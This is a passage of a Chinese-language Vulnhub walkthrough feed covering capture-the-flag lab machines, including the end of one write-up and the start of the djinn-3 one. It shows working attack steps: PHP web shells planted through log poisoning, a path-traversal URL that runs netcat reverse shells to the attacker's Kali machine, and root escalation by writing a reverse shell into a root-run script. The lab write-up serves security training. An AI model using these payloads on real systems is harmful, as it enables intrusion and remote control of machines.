+&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>curl http://10.0.2.15 -A &lt;span style="color:#cd5555">&amp;#39;&amp;lt;?php system($_GET[123]);?&amp;gt;&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/499/1.webp" alt="1">&lt;/p>
+&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/499/2.webp" alt="2">&lt;/p>
+&lt;p>写入成功&lt;/p>
+&lt;h3 id="靶机测试">靶机测试&lt;/h3>
+&lt;h4 id="思路一">思路一&lt;/h4>
+&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>curl http://10.0.2.4 -A &lt;span style="color:#cd5555">&amp;#39;&amp;lt;?php system($_GET[123]);?&amp;gt;&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>浏览器访问&lt;/p>
+&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a61717;background-color:#e3d2d2">http://10.0.2.4:8593/index.php?book=/../../../../../var/log/apache2/access.log&amp;amp;123=nc 10.0.2.15 444 -e /bin/bash
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>获得反弹shell，权限是&lt;code>www-data&lt;/code>&lt;/p>
+&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/499/4.webp" alt="4">&lt;/p>
+&lt;p>尝试写入当前目录，发现可写，果断wget一句话连antsword。&lt;/p>
+&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/499/5.webp" alt="5">&lt;/p>
+&lt;p>这里第一次连接失败，断掉nc连接成功&lt;/p>
+&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/499/6.webp" alt="6">&lt;/p>
+&lt;h4 id="靶机测试-思路二">靶机测试-思路二&lt;/h4>
+&lt;p>也可以直接写antsword用的&lt;code>&amp;lt;?php eval($_POST[123]); ?&amp;gt;&lt;/code>&lt;/p>
+&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>curl http://10.0.2.4 -A &lt;span style="color:#cd5555">&amp;#39;&amp;lt;?php system($_GET[123]);?&amp;gt;&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>antsword连上&lt;/p>
+&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a61717;background-color:#e3d2d2">http://10.0.2.4:8593/index.php?book=/../../../../../var/log/apache2/access.log
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>密码 &lt;code>123&lt;/code>&lt;/p>
+&lt;h4 id="靶机测试-思路三">靶机测试-思路三&lt;/h4>
+&lt;p>还可以使用burpsuite提交&lt;code>&amp;lt;?php eval($_POST['cmd']); ?&amp;gt;&lt;/code>burpsuite可避免转义&lt;/p>
+&lt;h2 id="提权">提权&lt;/h2>
+&lt;p>一番查看进程，发现有个root权限启动的web服务在57端口&lt;/p>
+&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/499/7.webp" alt="7">&lt;/p>
+&lt;p>刚好该目录index.php文件可以写入，果断写入nc反弹&lt;/p>
+&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>system(&lt;span style="color:#cd5555">&amp;#39;nc 10.0.2.15 555 -e /bin/sh&amp;#39;&lt;/span>);
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/499/9.webp" alt="9">&lt;/p>
+&lt;p>执行curl获得root&lt;/p>
+&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>curl http://127.0.0.1:57
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/499/10.webp" alt="10">&lt;/p>- https://www.vulnhub.cn/walkthrough/499/ - This is a customized copyright.</description></item><item><title>Vulnhub 492 djinn-3</title><link>https://www.vulnhub.cn/walkthrough/492/</link><pubDate>Fri, 19 Jun 2020 00:00:00 +0000</pubDate><guid>https://www.vulnhub.cn/walkthrough/492/</guid><description>Vulnhub靶机教程 https://www.vulnhub.cn/walkthrough/492/ -&lt;p>考点：flask&lt;/p>
+&lt;p>靶机链接：&lt;a href="https://www.vulnhub.com/entry/djinn-3,492/">https://www.vulnhub.com/entry/djinn-3,492/&lt;/a>&lt;/p>
+&lt;h2 id="环境配置">环境配置&lt;/h2>
+&lt;table>
+&lt;thead>
+&lt;tr>
+&lt;th>名称&lt;/th>
+&lt;th>IP&lt;/th>
+&lt;/tr>
+&lt;/thead>
+&lt;tbody>
+&lt;tr>
+&lt;td>Kali Linux&lt;/td>
+&lt;td>10.0.2.15&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>djinn-3&lt;/td>
+&lt;td>10.0.2.10&lt;/td>
+&lt;/tr>
+&lt;/tbody>
+&lt;/table>
+&lt;h2 id="初步打点">初步打点&lt;/h2>
+&lt;h3 id="端口扫描">端口扫描&lt;/h3>
+&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">49
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">50
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">51
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">52
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">53
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ &lt;span style="color:#658b00">export&lt;/span> &lt;span style="color:#00688b">rip&lt;/span>=10.0.2.10
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ sudo nmap -v -A -p- &lt;span style="color:#00688b">$rip&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>PORT STATE SERVICE VERSION
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| ssh-hostkey:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#b452cd">2048&lt;/span> e6:44:23:ac:b2:d9:82:e7:90:58:15:5e:40:23:ed:65 (RSA)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#b452cd">256&lt;/span> ae:04:85:6e:cb:10:4f:55:4a:ad:96:9e:f2:ce:18:4f (ECDSA)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ &lt;span style="color:#b452cd">256&lt;/span> f7:08:56:19:97:b5:03:10:18:66:7e:7d:2e:0a:47:42 (ED25519)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>80/tcp open http lighttpd 1.4.45
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-title: Custom-ers
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| http-methods:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ Supported Methods: OPTIONS GET HEAD POST
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-server-header: lighttpd/1.4.45
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>5000/tcp open http Werkzeug httpd 1.0.1 (Python 3.6.9)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| http-methods:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ Supported Methods: OPTIONS GET HEAD
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-title: Site doesn&lt;span style="color:#cd5555">&amp;#39;t have a title (text/html; charset=utf-8).
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#cd5555">|_http-server-header: Werkzeug/1.0.1 Python/3.6.9
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#cd5555">31337/tcp open Elite?
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#cd5555">| fingerprint-strings:
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#cd5555">| DNSStatusRequestTCP, DNSVersionBindReqTCP, NULL:
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#cd5555">| username&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#cd5555">| GenericLines, GetRequest, HTTPOptions, RTSPRequest, SIPOptions:
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#cd5555">| username&amp;gt; password&amp;gt; authentication failed
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#cd5555">| Help:
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#cd5555">| username&amp;gt; password&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#cd5555">| RPCCheck:
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#cd5555">| username&amp;gt; Traceback (most recent call last):
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#cd5555">| File &amp;#34;/opt/.tick-serv/tickets.py&amp;#34;, line 105, in &amp;lt;module&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#cd5555">| main()
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#cd5555">| File &amp;#34;/opt/.tick-serv/tickets.py&amp;#34;, line 93, in main
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#cd5555">| username = input(&amp;#34;username&amp;gt; &amp;#34;)
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#cd5555">| File &amp;#34;/usr/lib/python3.6/codecs.py&amp;#34;, line 321, in decode
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#cd5555">| (result, consumed) = self._buffer_decode(data, self.errors, final)
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#cd5555">| UnicodeDecodeError: &amp;#39;&lt;/span>utf-8&lt;span style="color:#cd5555">&amp;#39; codec can&amp;#39;&lt;/span>t decode byte 0x80 in position 0: invalid start byte
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| SSLSessionReq:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| username&amp;gt; Traceback (most recent call last):
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| File &lt;span style="color:#cd5555">&amp;#34;/opt/.tick-serv/tickets.py&amp;#34;&lt;/span>, line 105, in &amp;lt;module&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| main()
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| File &lt;span style="color:#cd5555">&amp;#34;/opt/.tick-serv/tickets.py&amp;#34;&lt;/span>, line 93, in main
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#00688b">username&lt;/span> = input(&lt;span style="color:#cd5555">&amp;#34;username&amp;gt; &amp;#34;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| File &lt;span style="color:#cd5555">&amp;#34;/usr/lib/python3.6/codecs.py&amp;#34;&lt;/span>, line 321, in decode
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| (result, consumed) = self._buffer_decode(data, self.errors, final)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| UnicodeDecodeError: &lt;span style="color:#cd5555">&amp;#39;utf-8&amp;#39;&lt;/span> codec can&lt;span style="color:#cd5555">&amp;#39;t decode byte 0xd7 in position 13: invalid continuation byte
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#cd5555">| TerminalServerCookie:
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#cd5555">| username&amp;gt; Traceback (most recent call last):
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#cd5555">| File &amp;#34;/opt/.tick-serv/tickets.py&amp;#34;, line 105, in &amp;lt;module&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#cd5555">| main()
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#cd5555">| File &amp;#34;/opt/.tick-serv/tickets.py&amp;#34;, line 93, in main
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#cd5555">| username = input(&amp;#34;username&amp;gt; &amp;#34;)
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#cd5555">| File &amp;#34;/usr/lib/python3.6/codecs.py&amp;#34;, line 321, in decode
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#cd5555">| (result, consumed) = self._buffer_decode(data, self.errors, final)
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#cd5555">|_ UnicodeDecodeError: &amp;#39;&lt;/span>utf-8&lt;span style="color:#cd5555">&amp;#39; codec can&amp;#39;&lt;/span>t decode byte 0xe0 in position 5: invalid continuation byte
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="web测试">WEB测试&lt;/h3>
+&lt;p>查看5000端口，感觉应该是存在flask SSTI漏洞&lt;/p>
+&lt;p>31337端口需要用户名密码，guest/guest 连上，发现可以发内容，并显示在5000端口&lt;/p>
+&lt;h3 id="漏洞发现">漏洞发现&lt;/h3>
+&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/492/1.webp" alt="1">&lt;/p>
+&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/492/2.webp" alt="2">&lt;/p>
+&lt;p>还可以执行命令了&lt;/p>
+&lt;p>本地http服务目录存放反弹shell脚本&lt;code>r.py&lt;/code>&lt;/p>
+&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
